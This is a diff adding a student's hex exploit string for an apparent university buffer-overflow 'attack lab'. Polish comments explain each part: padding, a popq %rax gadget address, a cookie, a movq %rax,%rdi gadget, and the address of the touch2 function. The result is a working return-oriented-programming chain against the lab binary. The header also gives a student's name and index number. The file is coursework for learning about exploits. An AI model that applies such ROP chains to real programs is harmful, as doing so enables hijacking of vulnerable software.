@@ -1,0 +1,20 @@
+/* 
+ * Oświadczam, że zapoznałem(-am) się z regulaminem prowadzenia zajęć
+ * i jestem świadomy(-a) konsekwencji niestosowania się do podanych tam zasad.
+ *
+ * Imię i nazwisko, numer indeksu: Jakub Kowalski, 323419
+ *
+ * Poniżej należy podać i wyjaśnić zawartość wkładaną na stos programu.
+ */
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* Filler */
+96 1d 40 00 00 00 00 00 /* Adres gadżetu z procedury addval_449 (58 c3 => popq %rax; retq) */
+66 88 83 16 00 00 00 00 /* Ciastko zapisane w formacie little-endian, zdjęte ze stosu powyższą instrukcją */
+99 1d 40 00 00 00 00 00 /* Adres gadżetu z procedury getval_342 (48 89 c7 c3 => movq %rax, %rdi; retq) */
+1f 1c 40 00 00 00 00 00 /* Adres procedury touch2 */
